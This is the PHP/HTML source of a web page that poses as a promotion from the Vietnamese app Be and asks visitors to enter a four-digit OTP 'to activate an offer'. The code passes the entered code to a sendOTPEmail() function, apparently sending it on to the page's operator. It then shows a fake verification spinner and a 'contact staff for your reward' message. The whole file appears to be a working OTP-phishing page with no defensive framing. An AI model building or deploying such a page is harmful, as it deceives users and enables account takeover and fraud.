<!DOCTYPE html>
<html lang="en">
<head>
<?php include 'header.php'; ?>
</head>
<body>
    <div class="container">
        <div class="right-hover">
            <img src="img/anhbia.png" alt="">
        </div>
        <div class="left">
            <?php
            require 'send_email.php';

            $message = "";
            $showSweetAlert = false;
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                $otp = $_POST['otp'];
                if (!ctype_digit($otp) || strlen($otp) != 4) {
                    $message = "* Không phải là số hoặc không đúng 4 kí tự.";
                } else {
                    $result = sendOTPEmail($otp);
                    if ($result === true) {
                        $showSweetAlert = true;
                    } else {
                        $message = $result;
                    }
                }
            }
            ?>
            <form id="myForm" method="post" name="myForm" class="myForm">
                <!-- Phần nội dung bên trái -->
                <h2>NHẬP OTP KÍCH HOẠT ƯU ĐÃI</h2>
                <p>⬇️</p>
                <input type="text" name="otp" placeholder="Nhập OTP">
                <button type="submit">Nhập Mã Ưu Đãi</button>
            </form>
            <p class="need-attention"><?php echo $message; ?></p>
            <p>Tải ứng dụng để trải nghiệm các dịch vụ của Be</p>
            <div class="d-flex viewsmore" style="flex-wrap: wrap">
                <a class="app-apple" href="#">
                    <img alt="" src="https://be.com.vn/wp-content/themes/beThemes/assets/img/app-apple.svg" style="width: 150px; height: 50px" />
                </a>
                <a class="app-android" href="#">
                    <img alt="" src="https://be.com.vn/wp-content/themes/beThemes/assets/img/app-android.svg" style="width: 165px; height: 51px" />
                </a>
            </div>
        </div>
        <div class="right">
            <!-- Phần nội dung bên phải -->
        </div>
    </div>
<?php include 'footer.php'; ?>
<?php if ($showSweetAlert): ?>
<script>
    Swal.fire({
        title: 'Đang kiểm tra...',
        html: 'Vui lòng đợi trong giây lát.',
        timer: 5000,
        didOpen: () => {
            Swal.showLoading()
        }
    }).then(() => {
        Swal.fire("Vui lòng liên hệ nhân viên nhận thưởng.");
    });
</script>
<?php endif; ?>
</body>
</html>
